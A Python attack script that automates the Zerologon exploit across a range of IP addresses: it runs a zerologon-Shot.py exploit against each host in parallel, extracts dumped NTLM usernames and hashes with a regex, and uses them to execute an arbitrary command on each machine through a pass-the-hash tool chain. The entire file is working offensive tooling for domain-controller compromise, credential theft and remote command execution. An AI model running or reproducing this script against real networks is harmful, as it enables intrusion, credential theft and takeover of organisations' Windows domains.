#!/usr/bin/env python3
import os
import subprocess
import re
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from exec_across_ips import run_chain, parse_ip_range

ZEROSHOT_TIMEOUT = 20
MAX_THREADS = 10

VERBOSE = False

# Thread-safe lock for printing
print_lock = threading.Lock()

def vprint(msg):
    if VERBOSE:
        with print_lock:
            print(msg)

def safe_print(msg):
    with print_lock:
        print(msg)

def run_zero_shot(ip):
    if os.path.exists("zerologon-Shot/zerologon-Shot.py") is False:
        raise SystemExit("[!] zerologon-Shot.py not found in zerologon-Shot/ directory")
    try:
        result = subprocess.run(
            ["python3", "zerologon-Shot/zerologon-Shot.py", ip],
            capture_output=True,
            text=True,
            timeout=ZEROSHOT_TIMEOUT
        )
        out = result.stdout + result.stderr
        vprint(f"[v] zerologon output for {ip}:\n{out}")
        return out
    except subprocess.TimeoutExpired:
        safe_print(f"[!] zerologon-shot timed out for {ip}")
        return ""


def parse_input(text):
    m = re.search(
        r"^(?:[A-Za-z0-9'\.\-]+\\)?([A-Za-z0-9'\.\$\-_]+):\d+:([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::",
        text,
        re.MULTILINE
    )
    if not m:
        return {"user": None, "lmhash": None, "nthash": None}

    return {
        "user": m.group(1),
        "lmhash": m.group(2),
        "nthash": m.group(3)
    }


def process_ip(ip, command):
    """Worker function to process a single IP through zerologon and command execution"""
    text = run_zero_shot(ip)
    time.sleep(1)
    parsed = parse_input(text)
    user = parsed["user"]
    nthash = parsed["nthash"]

    if not (user and nthash):
        safe_print(f"[!] No valid creds extracted for {ip}, skipping.")
        return (ip, None, None)

    safe_print(f"Parsed Credentials for {ip}: {user}:{nthash}")

    tool = run_chain(user, ip, nthash, command)

    if tool is None:
        safe_print(f"[!] All tools failed for {ip}.")
        return (ip, None, None)
    else:
        safe_print(f"[+] Command executed on {ip} using {tool}.")
        return (ip, user, tool)


def main():
    global VERBOSE
    import exec_across_ips

    if len(sys.argv) < 2:
        print("Usage: zs_command.py <ip_range> <command> [-v]")
        print("Example: zs_command.py 10.100.101-130,132.35 'whoami'")
        sys.exit(1)

    # detect -v anywhere
    if "-v" in sys.argv:
        VERBOSE = True
        exec_across_ips.VERBOSE = True
        sys.argv.remove("-v")

    # Share the print lock with exec_across_ips module
    exec_across_ips.print_lock = print_lock

    ip_range = sys.argv[1]
    ips = parse_ip_range(ip_range)

    command = " ".join(sys.argv[2:]) if len(sys.argv) > 2 else "whoami"

    print(f"[*] Processing {len(ips)} IPs with {MAX_THREADS} threads...")

    # Use ThreadPoolExecutor to process IPs in parallel
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # Submit all tasks
        futures = [executor.submit(process_ip, ip, command) for ip in ips]

        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                safe_print(f"[!] Exception occurred: {e}")


if __name__ == "__main__":
    main()
